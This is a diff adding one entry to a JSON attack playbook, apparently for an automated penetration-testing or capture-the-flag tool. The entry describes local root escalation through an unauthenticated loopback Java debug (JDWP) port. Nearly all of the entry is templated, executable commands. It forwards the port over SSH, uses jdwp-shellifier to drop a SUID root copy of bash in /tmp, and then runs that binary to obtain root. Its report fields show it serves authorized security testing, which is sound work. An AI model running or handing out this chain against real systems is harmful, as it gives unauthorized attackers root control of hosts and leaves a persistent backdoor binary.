@@ -2138,6 +2138,70 @@
           "locus": "onhost"
         }
       ]
+    },
+    {
+      "id": "jdwp-local-privesc",
+      "transition": "privesc_act",
+      "title": "Local Root via Loopback Java Debug Wire Protocol (JDWP)",
+      "phase": "escalate",
+      "hypothesis": "A root-owned JVM started with -agentlib:jdwp or -Xrunjdwp binds an unauthenticated JDWP debug socket on loopback (commonly 127.0.0.1:8000 or 5005). Forwarding that loopback port over SSH and attaching jdwp-shellifier (or jdb) executes arbitrary OS commands inside the privileged JVM runtime.",
+      "tool": "ssh",
+      "tools": [
+        "ssh",
+        "python2",
+        "bash"
+      ],
+      "os": [
+        "linux"
+      ],
+      "sequence": true,
+      "requires_all": [
+        "foothold.linux"
+      ],
+      "requires_any": [
+        "vuln.jdwp"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "priority": 82,
+      "proves": "root command execution through an unauthenticated loopback JDWP debugger port",
+      "does_not_prove": "escalation if the target JVM runs under an unprivileged service user rather than root",
+      "report": {
+        "finding": "Local Root Privilege Escalation via Unauthenticated Loopback JDWP Debugger",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://github.com/IOActive/jdwp-shellifier"
+      ],
+      "commands": [
+        {
+          "tool": "ssh",
+          "locus": "remote",
+          "run": "ssh -N -L {{jdwp_port|8000}}:127.0.0.1:{{jdwp_port|8000}} {{user}}@{{target}}",
+          "note": "Forward the target's loopback JDWP listener (127.0.0.1:{{jdwp_port|8000}}) to your Kali box over SSH (or use chisel R:{{jdwp_port|8000}}:127.0.0.1:{{jdwp_port|8000}} when SSH is unavailable)."
+        },
+        {
+          "tool": "python2",
+          "locus": "remote",
+          "run": "python2 jdwp-shellifier.py -t 127.0.0.1 -p {{jdwp_port|8000}} --break-on 'java.lang.String.indexOf' --cmd 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'",
+          "note": "Attach jdwp-shellifier to the forwarded JDWP socket, set a breakpoint on a frequently hit Java method, and drop a SUID root bash binary when the JVM hits the breakpoint."
+        },
+        {
+          "tool": "bash",
+          "locus": "onhost",
+          "run": "/tmp/rootbash -p -c 'id; whoami'",
+          "note": "On the target foothold, trigger activity on the Java application if needed so the breakpoint fires, then invoke the SUID bash binary with -p to confirm uid=0(root) / euid=0(root)."
+        }
+      ]
     }
   ]
 }
